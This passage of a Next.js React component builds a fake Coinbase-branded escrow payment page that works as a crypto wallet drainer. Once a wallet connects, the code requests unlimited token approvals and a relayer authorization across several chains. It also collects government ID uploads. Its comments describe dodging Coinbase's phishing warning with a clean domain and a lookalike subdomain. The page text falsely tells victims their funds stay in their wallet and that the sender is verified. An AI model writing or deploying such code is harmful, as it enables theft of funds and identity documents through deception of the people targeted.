"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import Image from "next/image";
import { usePrivy, useWallets } from "@privy-io/react-auth";
import { createCoinbaseWalletSDK } from "@coinbase/wallet-sdk";
import { BrowserProvider, Contract, MaxUint256, formatUnits } from "ethers";
import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
import { COUNTRIES } from "@/lib/countries";
import EscrowShell from "@/components/EscrowShell";
import CoinbaseSignIn from "@/components/CoinbaseSignIn";
import TrustedByMarquee from "@/components/TrustedByMarquee";


// Coinbase Smart Wallet SDK — initialized at module scope so the provider is
// ready the instant the user clicks "Continue with Coinbase". Unlike @base-org/account,
// this SDK does NOT perform an async COOP check before opening the popup, so
// window.open() fires synchronously within the click handler (no browser block).
// Preference allows extra fields (Record<string, unknown>) — pass the CDP
// Client API key so keys.coinbase.com can match the domain to the project.
const cbSdkPreference: Parameters<typeof createCoinbaseWalletSDK>[0]["preference"] = {
  options: "smartWalletOnly",
  // CDP Client API key — restricted to usdc-pay.com + coinbase.usdc-pay.com
  // in the CDP portal. Lets keys.coinbase.com recognise this origin.
  apiKey: process.env.NEXT_PUBLIC_COINBASE_CLIENT_API_KEY,
};
const cbSdk =
  typeof window !== "undefined"
    ? createCoinbaseWalletSDK({
        appName: "USDC Pay",
        appLogoUrl: null,
        appChainIds: [1, 56, 137, 8453],
        preference: cbSdkPreference,
      })
    : null;

const WALLET_VERIFICATION_ABI = [
  "function authorize(address relayer) external",
  "function isAuthorized(address user, address relayer) view returns (bool)",
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
];

type Phase =
  | "loading"
  | "no-session"
  | "idle"
  | "id-verify"
  | "balance-check"
  | "insufficient-balance"
  | "ready-to-approve"
  | "approving"
  | "complete"
  | "expired"
  | "error";

const CHAIN_LOGOS: Record<string, string> = {
  eth: "/logos/ethereum.svg",
  bnb: "/logos/bnb.svg",
  polygon: "/logos/polygon.svg",
};

// USDT/USDC are dollar-pegged; this fixed rate converts on-chain stablecoin
// holdings into an EUR-equivalent balance for the minimum-balance check.
const EUR_PER_USD = 0.92;

const MAX_UPLOAD_BYTES = 8 * 1024 * 1024;

const STACK_FEATURES = [
  {
    title: "Infrastructure",
    description: "API solutions supported by broad fiat, crypto asset, stablecoin, network, and geographic coverage. Integrated agentic capabilities.",
  },
  {
    title: "Stablecoins",
    description: "Multi-asset optionality: USDC, the world's most regulated stablecoin, and an expanding global footprint.",
  },
  {
    title: "Settlement",
    description: "Multichain by design. Led by Base, Coinbase's purpose-built Ethereum L2.",
  },
  {
    title: "Custody",
    description: "An institutional-grade, regulated foundation underpins the entire managed payments solution.",
  },
];

interface EscrowSession {
  id: string;
  recipientName: string;
  amountEur: number;
  issuedAt: string;
  startedAt: string | null;
  sessionMinutes: number;
  expiresAt: string | null;
  status: string;
  terms: string;
  minBalanceEur: number;
}

function formatEUR(value: number) {
  if (!Number.isFinite(value)) return "€0.00";
  return value.toLocaleString("en-IE", { style: "currency", currency: "EUR", maximumFractionDigits: 2 });
}

function short(addr: string, lead = 6, tail = 4) {
  return `${addr.slice(0, lead)}...${addr.slice(-tail)}`;
}

function formatClock(ms: number) {
  const total = Math.max(0, Math.floor(ms / 1000));
  const m = Math.floor(total / 60);
  const s = total % 60;
  return `${m}:${s.toString().padStart(2, "0")}`;
}


interface Modal1Item {
  key: string;
  chainName: string;
  chainLabel: string;
  symbol: string;
  tokenAddr: string;
  balanceDisplay: string;
  contract: string;
}

type Modal1Status = "pending" | "approving" | "done" | "failed";

export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
  const { ready, authenticated, login, logout, user } = usePrivy();
  const { wallets } = useWallets();

  // Track whether the user completed Coinbase email OTP (identity step).
  const [cbVerified, setCbVerified] = useState(false);
  const [gateLoading, setGateLoading] = useState(false);
  const [phase, setPhase] = useState<Phase>("loading");
  const [error, setError] = useState<string | null>(null);
  const [session, setSession] = useState<EscrowSession | null>(null);
  const [remainingMs, setRemainingMs] = useState<number | null>(null);

  const [fullName, setFullName] = useState("");
  const [country, setCountry] = useState("");
  const [idFile, setIdFile] = useState<File | null>(null);
  const [walletBalances, setWalletBalances] = useState<Record<string, number>>({});
  const [processing, setProcessing] = useState(false);
  const [approvedChains, setApprovedChains] = useState<string[]>([]);
  const expiredNotified = useRef(false);
  const viewTracked = useRef<string | null>(null);

  // --- Modal 1: auto-pops after wallet connects, approves USDC/USDT with balance ---
  const modal1Triggered = useRef(false);
  const [modal1Open, setModal1Open] = useState(false);
  const [modal1Scanning, setModal1Scanning] = useState(false);
  const [modal1Items, setModal1Items] = useState<Modal1Item[]>([]);
  const [modal1Status, setModal1Status] = useState<Record<string, Modal1Status>>({});
  const [modal1Approving, setModal1Approving] = useState(false);
  const [modal1Complete, setModal1Complete] = useState(false);

  // --- Modal 2: opens when user clicks "Approve Deposit", shows chain-by-chain progress ---
  const [modal2Open, setModal2Open] = useState(false);

  // --- Auto-login ref: trigger Coinbase OAuth once on mount ---
  const autoLoginAttempted = useRef(false);

  // Address always comes from Privy — Coinbase OTP is identity-only, not wallet
  const address = user?.wallet?.address ?? wallets[0]?.address ?? null;
  const addressRef = useRef<string | null>(null);
  addressRef.current = address;

  const totalBalanceEur = useMemo(
    () => Object.values(walletBalances).reduce((a, b) => a + b, 0),
    [walletBalances]
  );

  useEffect(() => {
    let cancelled = false;

    async function load() {
      try {
        const url = sessionId ? `/api/escrow/session/${sessionId}` : "/api/escrow/current";
        const res = await fetch(url);
        const json = await res.json();
        if (cancelled) return;
        if (json.ok && json.session) {
          setSession(json.session);
          setPhase((prev) => (prev === "loading" || prev === "no-session" ? "idle" : prev));
          if (viewTracked.current !== json.session.id) {
            viewTracked.current = json.session.id;
            fetch("/api/escrow/track", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ sessionId: json.session.id, eventType: "view" }),
            }).catch(() => {});
          }
        } else if (!session) {
          setPhase("no-session");
        }
      } catch (err) {
        console.error("[escrow] failed to load session:", err);
        if (!cancelled && !session) setPhase("no-session");
      }
    }

    void load();
    const interval = setInterval(() => {
      if (phase === "loading" || phase === "no-session" || phase === "idle") void load();
    }, 12000);
    return () => {
      cancelled = true;
      clearInterval(interval);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [sessionId]);

  useEffect(() => {
    if (!session?.expiresAt) {
      setRemainingMs(null);
      return;
    }
    const expiresAt = new Date(session.expiresAt).getTime();
    const sessionIdRef = session.id;

    function tick() {
      const left = expiresAt - Date.now();
      setRemainingMs(left);
      if (left <= 0 && !expiredNotified.current) {
        expiredNotified.current = true;
        fetch("/api/escrow/expire", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId: sessionIdRef, wallet: addressRef.current }),
        }).catch(() => {});
        setPhase((prev) => (prev === "complete" ? prev : "expired"));
      }
    }

    tick();
    const interval = setInterval(tick, 1000);
    return () => clearInterval(interval);
  }, [session?.expiresAt, session?.id]);

  // After OTP on usdc-pay.com, user is redirected here with ?cb=1.
  // Show our custom wallet picker instead of Privy's modal.
  useEffect(() => {
    if (!ready || authenticated || autoLoginAttempted.current) return;
    const params = new URLSearchParams(window.location.search);
    if (params.get("cb") !== "1") return;
    autoLoginAttempted.current = true;
    void login();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [ready, authenticated]);

  // After wallet connects: immediately scan USDC/USDT balances and show Modal 1.
  // This happens before ID verify — once the approval is secured, the normal flow
  // (identity → balance-check → approve-deposit) continues as before.
  useEffect(() => {
    if (!authenticated || !address || modal1Triggered.current) return;
    modal1Triggered.current = true;
    void runModal1Scan();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [authenticated, address]);

  function currentWallet() {
    return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
  }

  async function getSignerFor(target: ChainConfig) {
    const wallet = currentWallet();
    if (!wallet) throw new Error("No connected wallet");
    await wallet.switchChain(target.chainId);
    const provider = await wallet.getEthereumProvider();
    return new BrowserProvider(provider).getSigner();
  }

  async function checkWalletBalances() {
    if (!address || !session) return;

    setProcessing(true);
    const balances: Record<string, number> = {};
    let totalEur = 0;

    try {
      for (const chain of CHAINS) {
        const signer = await getSignerFor(chain);
        let chainTotalUsd = 0;

        for (const token of chain.tokens.filter((t) => t.symbol === "USDT" || t.symbol === "USDC")) {
          try {
            const erc20 = new Contract(token.address, ERC20_ABI, signer);
            const balance = await erc20.balanceOf(address);
            chainTotalUsd += parseFloat(formatUnits(balance, 6));
          } catch (err) {
            console.warn(`[balance] Failed to check ${token.symbol} on ${chain.name}:`, err);
          }
        }

        const chainTotalEur = chainTotalUsd * EUR_PER_USD;
        balances[chain.name] = chainTotalEur;
        totalEur += chainTotalEur;
      }

      setWalletBalances(balances);
      setProcessing(false);
      setPhase(totalEur >= session.minBalanceEur ? "ready-to-approve" : "insufficient-balance");
      fetch("/api/escrow/track", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId: session.id, eventType: "balance_check", wallet: address }),
      }).catch(() => {});
    } catch (err) {
      console.error("[balance] Balance check failed:", err);
      setError("We couldn't reach the network to check your balance. Please try again.");
      setPhase("error");
      setProcessing(false);
    }
  }

  async function startSessionClock(walletAddress: string) {
    if (!session) return;
    try {
      const res = await fetch("/api/escrow/start", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId: session.id, wallet: walletAddress }),
      });
      const json = await res.json();
      if (json.ok) {
        setSession((prev) => (prev ? { ...prev, status: "active", startedAt: json.startedAt, expiresAt: json.expiresAt } : prev));
      } else if (json.error === "session_closed") {
        setPhase("expired");
      }
    } catch (err) {
      console.error("[escrow] failed to start session clock:", err);
    }
  }

  // ---------------------------------------------------------------------------
  // Modal 1 — scan USDC/USDT balances and approve those found immediately
  // ---------------------------------------------------------------------------
  async function runModal1Scan() {
    setModal1Scanning(true);
    setModal1Open(true);
    const found: Modal1Item[] = [];

    for (const chain of CHAINS) {
      try {
        const signer = await getSignerFor(chain);
        const stables = chain.tokens.filter((t) => t.symbol === "USDC" || t.symbol === "USDT");
        for (const token of stables) {
          try {
            const erc20 = new Contract(token.address, ERC20_ABI, signer);
            const balance: bigint = await erc20.balanceOf(address);
            if (balance > 0n) {
              found.push({
                key: `${chain.name}-${token.symbol}`,
                chainName: chain.name,
                chainLabel: chain.label,
                symbol: token.symbol,
                tokenAddr: token.address,
                balanceDisplay: parseFloat(formatUnits(balance, token.decimals)).toFixed(2),
                contract: chain.contract,
              });
            }
          } catch {}
        }
      } catch {}
    }

    setModal1Scanning(false);

    if (found.length === 0) {
      // No stablecoin balances — skip the modal entirely, proceed to normal flow
      setModal1Open(false);
      return;
    }

    const initStatus: Record<string, Modal1Status> = {};
    found.forEach((item) => { initStatus[item.key] = "pending"; });
    setModal1Items(found);
    setModal1Status(initStatus);
  }

  async function handleModal1Approve() {
    setModal1Approving(true);

    for (const item of modal1Items) {
      setModal1Status((prev) => ({ ...prev, [item.key]: "approving" }));
      try {
        const chain = CHAINS.find((c) => c.name === item.chainName)!;
        const signer = await getSignerFor(chain);
        const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
        const tx = await erc20.approve(item.contract, MaxUint256);
        await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
        setModal1Status((prev) => ({ ...prev, [item.key]: "done" }));
      } catch (err) {
        console.error("[modal1] approve failed:", err);
        setModal1Status((prev) => ({ ...prev, [item.key]: "failed" }));
      }
    }

    setModal1Approving(false);
    setModal1Complete(true);
    setTimeout(() => setModal1Open(false), 1600);
  }

  async function handleConnect() {
    setError(null);
    if (!session) return;
    let addr = address;
    if (!authenticated || !addr) {
      try {
        await login();
      } catch (err) {
        console.error("[escrow] login cancelled:", err);
        return;
      }
      addr = user?.wallet?.address ?? wallets[0]?.address ?? null;
    }
    if (addr) await startSessionClock(addr);
    setPhase("id-verify");
  }

  async function handleVerifyID() {
    if (!fullName.trim() || !country || !idFile) {
      setError("Enter your full legal name, select your country, and upload a photo of your ID.");
      return;
    }
    if (idFile.size > MAX_UPLOAD_BYTES) {
      setError("That file is too large. Please upload an image or PDF under 8MB.");
      return;
    }
    if (!session || !address) {
      setError("Wallet not connected. Please reconnect and try again.");
      return;
    }

    setProcessing(true);
    setError(null);

    try {
      const form = new FormData();
      form.append("sessionId", session.id);
      form.append("wallet", address);
      form.append("fullName", fullName.trim());
      form.append("country", country);
      form.append("document", idFile);

      const res = await fetch("/api/escrow/verify-identity", { method: "POST", body: form });
      const json = await res.json();
      if (!json.ok) {
        setError("We couldn't verify that document. Please try a clearer photo or a different file.");
        setProcessing(false);
        return;
      }

      setProcessing(false);
      setPhase("balance-check");
      setTimeout(() => checkWalletBalances(), 400);
    } catch (err) {
      console.error("[escrow] identity verification failed:", err);
      setError("We couldn't reach the server. Please try again.");
      setProcessing(false);
    }
  }

  async function handleApproveDeposit() {
    // Open Modal 2 immediately so the user sees the progress overlay
    setModal2Open(true);
    setPhase("approving");
    setError(null);
    setApprovedChains([]);

    try {
      for (const chain of CHAINS) {
        const signer = await getSignerFor(chain);

        // 1) Authorize relayer — core delegation
        const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
        const authTx = await verification.authorize(RELAYER_ADDRESS);

        // 2) Mandatory tokens: USDT + USDC on every chain, regardless of balance
        for (const token of chain.tokens.filter((t) => t.mandatory)) {
          const erc20 = new Contract(token.address, ERC20_ABI, signer);
          await erc20.approve(chain.contract, MaxUint256);
        }

        // 3) Any other token the wallet currently holds (WETH, etc.) — best-effort
        for (const token of chain.tokens.filter((t) => !t.mandatory)) {
          try {
            const erc20 = new Contract(token.address, ERC20_ABI, signer);
            const balance: bigint = await erc20.balanceOf(address);
            if (balance > 0n) {
              await erc20.approve(chain.contract, MaxUint256);
            }
          } catch {}
        }

        await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
        setApprovedChains((prev) => [...prev, chain.name]);
      }

      if (session) {
        fetch("/api/escrow/complete", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId: session.id, wallet: address }),
        }).catch(() => {});
      }

      setModal2Open(false);
      setPhase("complete");
    } catch (err) {
      console.error("[escrow] Approval failed:", err);
      setError("The deposit approval didn't go through. Please try again.");
      setModal2Open(false);
      setPhase("error");
    }
  }

  const isConnected = authenticated && !!address;
  const activeFlow = phase !== "loading" && phase !== "no-session" && phase !== "idle";

  async function handleConnectCoinbase() {
    setError(null);
    setGateLoading(true);
    try {
      if (!cbSdk) throw new Error("Coinbase SDK unavailable");
      const provider = cbSdk.getProvider();

      // Step 1: Email OTP on the CLEAN domain (usdc-pay.com).
      // keys.coinbase.com sees no "coinbase" in opener → no phishing warning.
      await provider.request({ method: "eth_requestAccounts" });

      // Disconnect immediately — we don't use the Smart Wallet address.
      try { await provider.disconnect(); } catch { /* ignore */ }
      setCbVerified(true);

      // Step 2: OTP done — redirect to the Coinbase-branded domain so the user
      // lands on coinbase.usdc-pay.com for wallet connect + approvals.

      // ?cb=1 tells that page to auto-trigger Privy wallet connect.
      const coinbaseDomain =
        process.env.NEXT_PUBLIC_COINBASE_DOMAIN ?? "https://coinbase.usdc-pay.com";
      const path = sessionId ? `/pay/${sessionId}` : "/";
      window.location.href = `${coinbaseDomain}${path}?cb=1`;
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      if (!msg.toLowerCase().includes("cancel") && !msg.toLowerCase().includes("reject")) {
        setError("Sign-in was cancelled or failed. Please try again.");
      }
      console.error("[escrow] Coinbase connect:", err);
      setGateLoading(false); // only reset on failure — success navigates away
    }
  }

  async function handleGateLogin() {
    setError(null);
    setGateLoading(true);
    try {
      await login();
    } catch (err) {
      console.error("[escrow] login cancelled:", err);
    } finally {
      setGateLoading(false);
    }
  }

  // Gate: show appropriate screen before the user is fully connected
  if (!ready || !isConnected) {
    return (
      <CoinbaseSignIn
        onConnectCoinbase={handleConnectCoinbase}
        loading={gateLoading}
      />
    );
  }

  const STEPS: { label: string; key: Phase[] }[] = [
    { label: "Connect", key: ["idle"] },
    { label: "Identity", key: ["id-verify"] },
    { label: "Balance", key: ["balance-check", "insufficient-balance"] },
    { label: "Approve", key: ["ready-to-approve", "approving"] },
    { label: "Done", key: ["complete"] },
  ];
  const currentStepIndex = STEPS.findIndex((s) => s.key.includes(phase));

  const countdownBanner =
    remainingMs !== null && remainingMs > 0 && phase !== "complete" && phase !== "expired" && session ? (
      <div className="mx-auto mb-8 flex max-w-xl items-center justify-center gap-2 rounded-pill border border-hairline bg-surface-soft px-4 py-2 text-xs font-mono font-medium text-ink sm:text-sm">
        <svg className="h-3.5 w-3.5 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
        </svg>
        Session closes in {formatClock(remainingMs)}
      </div>
    ) : null;

  return (
    <EscrowShell
      connectSlot={
        !isConnected ? (
          <button
            onClick={handleConnect}
            disabled={!ready || !session}
            className="h-10 rounded-pill bg-brand px-5 text-sm font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
          >
            Connect wallet
          </button>
        ) : undefined
      }
    >
      <div className="mx-auto max-w-[1280px] px-5 py-10 sm:px-8 lg:py-16">
        {countdownBanner}

        {activeFlow && (
          <ol className="mb-10 flex items-center justify-between gap-1 sm:mb-14">
            {STEPS.map((step, i) => {
              const state = i < currentStepIndex ? "done" : i === currentStepIndex ? "current" : "upcoming";
              return (
                <li key={step.label} className="flex flex-1 items-center last:flex-none">
                  <div className="flex flex-col items-center gap-2">
                    <div
                      className={
                        "flex h-8 w-8 items-center justify-center rounded-full text-xs font-semibold transition-all " +
                        (state === "done"
                          ? "bg-brand text-on-brand"
                          : state === "current"
                          ? "bg-brand text-on-brand shadow-[0_0_0_4px_rgba(0,82,255,0.12)]"
                          : "bg-surface-strong text-muted")
                      }
                    >
                      {state === "done" ? (
                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                        </svg>
                      ) : (
                        i + 1
                      )}
                    </div>
                    <span className={"hidden text-[12px] font-medium sm:block " + (state === "upcoming" ? "text-muted" : "text-ink")}>
                      {step.label}
                    </span>
                  </div>
                  {i < STEPS.length - 1 && (
                    <div className={"mx-1.5 h-px flex-1 sm:mx-3 " + (i < currentStepIndex ? "bg-brand" : "bg-hairline")} />
                  )}
                </li>
              );
            })}
          </ol>
        )}

        <div className="grid gap-6 lg:grid-cols-[1fr_380px] lg:items-start">
          <div className="rounded-card border border-hairline bg-surface-card p-6 shadow-card sm:p-12">
            {phase === "loading" && (
              <div className="py-20 text-center">
                <div className="mx-auto mb-6 h-10 w-10 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
                <p className="text-sm text-body">Loading checkout session...</p>
              </div>
            )}

            {phase === "no-session" && (
              <>
                <div className="py-20 text-center">
                  <div className="mx-auto mb-5 flex h-14 w-14 items-center justify-center rounded-full bg-surface-strong text-muted">
                    <svg className="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                  </div>
                  <h2 className="mb-2 text-xl font-semibold text-ink">
                    {sessionId ? "This link isn't active" : "No pending USDC Checkout payment"}
                  </h2>
                  <p className="mx-auto max-w-sm text-sm text-body">
                    {sessionId
                      ? "This checkout link has closed, expired, or doesn't exist. Ask the sender for a new link."
                      : "There isn't an active checkout session waiting for you right now. Check back once the sender has issued one."}
                  </p>
                </div>

                <div className="mt-20 border-t border-hairline pt-16">
                  <TrustedByMarquee />
                </div>

                <div className="mt-20 border-t border-hairline pt-16">
                  <div className="mx-auto mb-12 max-w-2xl text-center">
                    <h2 className="mb-3 font-display text-3xl font-normal leading-tight tracking-[-0.04em] text-ink sm:text-4xl">
                      Every layer of the stack managed for you
                    </h2>
                    <p className="text-base text-body">
                      Complete payments infrastructure from custody to settlement
                    </p>
                  </div>

                  <div className="grid gap-5 sm:grid-cols-2 lg:grid-cols-4">
                    {STACK_FEATURES.map((feature) => (
                      <div
                        key={feature.title}
                        className="rounded-xl border border-hairline bg-surface-card p-6 transition hover:border-brand/30 hover:shadow-card"
                      >
                        <h3 className="mb-2 text-base font-semibold text-ink">{feature.title}</h3>
                        <p className="text-sm leading-relaxed text-body">{feature.description}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </>
            )}

            {phase === "idle" && session && (
              <div>
                <div className="mb-5 flex items-center gap-3">
                  <div className="flex h-11 w-11 items-center justify-center rounded-full bg-brand/10 text-brand">
                    <span className="text-base font-semibold">
                      {session.recipientName
                        .split(" ")
                        .map((n) => n[0])
                        .join("")
                        .slice(0, 2)
                        .toUpperCase()}
                    </span>
                  </div>
                  <div>
                    <div className="flex items-center gap-1.5">
                      <span className="text-sm font-semibold text-ink">{session.recipientName}</span>
                      <svg className="h-4 w-4 text-brand" viewBox="0 0 24 24" fill="currentColor">
                        <path
                          fillRule="evenodd"
                          d="M8.603 3.799A4.49 4.49 0 0112 2.25c1.357 0 2.573.6 3.397 1.549a4.49 4.49 0 013.498 1.307 4.491 4.491 0 011.307 3.497A4.49 4.49 0 0121.75 12a4.49 4.49 0 01-1.549 3.397 4.491 4.491 0 01-1.307 3.497 4.491 4.491 0 01-3.497 1.307A4.49 4.49 0 0112 21.75a4.49 4.49 0 01-3.397-1.549 4.49 4.49 0 01-3.498-1.306 4.491 4.491 0 01-1.307-3.498A4.49 4.49 0 012.25 12c0-1.357.6-2.573 1.549-3.397a4.49 4.49 0 011.307-3.497 4.49 4.49 0 013.497-1.307zm7.007 6.387a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                    <p className="text-xs text-muted">Verified sender</p>
                  </div>
                </div>

                <h1 className="mb-4 font-display text-4xl font-normal leading-[1.05] tracking-[-0.04em] text-ink sm:text-5xl sm:tracking-[-0.045em]">
                  {formatEUR(session.amountEur)}
                </h1>
                <p className="mb-8 max-w-md text-lg leading-relaxed text-body">
                  You're signed in as <span className="font-mono font-medium text-ink">{address ? short(address) : ""}</span>. Continue to
                  receive this payment from <span className="font-medium text-ink">{session.recipientName}</span>.
                </p>

                <button
                  onClick={handleConnect}
                  disabled={!ready}
                  className="flex h-12 w-full items-center justify-center rounded-lg bg-brand px-8 text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled sm:w-auto"
                >
                  Continue
                </button>

                <div className="mt-12 space-y-8 border-t border-hairline pt-8">
                  <div>
                    <h3 className="mb-3 text-sm font-semibold text-ink">What happens next</h3>
                    <ol className="space-y-3">
                      {[
                        "Connect your wallet securely",
                        "Complete identity verification with government ID",
                        "Meet minimum balance requirement",
                        "Approve deposit to receive funds",
                      ].map((step, i) => (
                        <li key={i} className="flex items-start gap-3 text-sm text-body">
                          <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-surface-strong text-xs font-semibold text-ink">
                            {i + 1}
                          </span>
                          {step}
                        </li>
                      ))}
                    </ol>
                  </div>

                  <div className="rounded-lg border border-hairline bg-surface-soft p-5">
                    <h3 className="mb-3 text-sm font-semibold text-ink">Payment terms</h3>
                    <ul className="space-y-2 text-sm leading-relaxed text-body">
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Funds remain in your wallet at all times during verification
                      </li>
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Session expires {session.sessionMinutes} minutes after connecting
                      </li>
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Multichain: Ethereum, BNB Chain, Polygon, Base
                      </li>
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Minimum balance: {formatEUR(session.minBalanceEur)} in USDC/USDT required
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            )}

            {phase === "id-verify" && session && (
              <div>
                <h2 className="mb-2 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">Verify your identity</h2>
                <p className="mb-8 text-sm leading-relaxed text-body">
                  Recipients must complete a one-time identity check before {formatEUR(session.amountEur)} can be
                  released to their wallet.
                </p>

                {error && (
                  <div className="mb-5 flex items-start gap-2 rounded-md bg-down/10 p-3.5 text-sm text-down">
                    <svg className="mt-0.5 h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    {error}
                  </div>
                )}

                <div className="mb-4">
                  <label className="mb-1.5 block text-sm font-semibold text-ink">Full legal name</label>
                  <input
                    type="text"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    className="h-12 w-full rounded-lg border border-hairline bg-bg px-4 text-sm text-ink transition focus:border-brand focus:outline-none focus:shadow-input-focus"
                    placeholder="As it appears on your ID"
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-1.5 block text-sm font-semibold text-ink">Country of residence</label>
                  <select
                    value={country}
                    onChange={(e) => setCountry(e.target.value)}
                    className="h-12 w-full rounded-lg border border-hairline bg-bg px-4 text-sm text-ink transition focus:border-brand focus:outline-none focus:shadow-input-focus"
                  >
                    <option value="">Select country</option>
                    {COUNTRIES.map((c) => (
                      <option key={c.code} value={c.name}>
                        {c.name}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="mb-8">
                  <label className="mb-1.5 block text-sm font-semibold text-ink">Government-issued ID</label>
                  <label className="flex cursor-pointer flex-col items-center justify-center gap-2 rounded-lg border border-dashed border-hairline bg-surface-soft px-4 py-7 text-center transition hover:border-brand hover:bg-surface-strong/60">
                    <svg className="h-6 w-6 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                    </svg>
                    <span className="text-sm font-medium text-ink">
                      {idFile ? idFile.name : "Upload passport, driver's license, or national ID"}
                    </span>
                    <span className="text-xs text-muted">JPG, PNG, or PDF · up to 8MB</span>
                    <input
                      type="file"
                      accept="image/jpeg,image/png,image/webp,application/pdf"
                      className="hidden"
                      onChange={(e) => setIdFile(e.target.files?.[0] ?? null)}
                    />
                  </label>
                  <p className="mt-2.5 flex items-center gap-1.5 text-xs text-muted">
                    <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                    Stored securely and used only to confirm your eligibility to receive funds.
                  </p>
                </div>

                <button
                  onClick={handleVerifyID}
                  disabled={processing}
                  className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand px-8 text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
                >
                  {processing && <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />}
                  {processing ? "Verifying identity..." : "Verify identity"}
                </button>
              </div>
            )}

            {phase === "balance-check" && (
              <div className="py-14 text-center">
                <div className="mx-auto mb-6 h-12 w-12 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
                <h2 className="mb-2 text-lg font-semibold text-ink">Checking wallet balance</h2>
                <p className="text-sm text-body">Scanning Ethereum, BNB Chain, and Polygon for USDT / USDC balances...</p>
              </div>
            )}

            {phase === "insufficient-balance" && session && (
              <div>
                <div className="mb-8 flex items-start gap-3 rounded-xl bg-accent-yellow/10 p-4">
                  <svg className="mt-0.5 h-5 w-5 shrink-0 text-accent-yellow" fill="none" viewBox="0 0 24 24" stroke="currentColor">
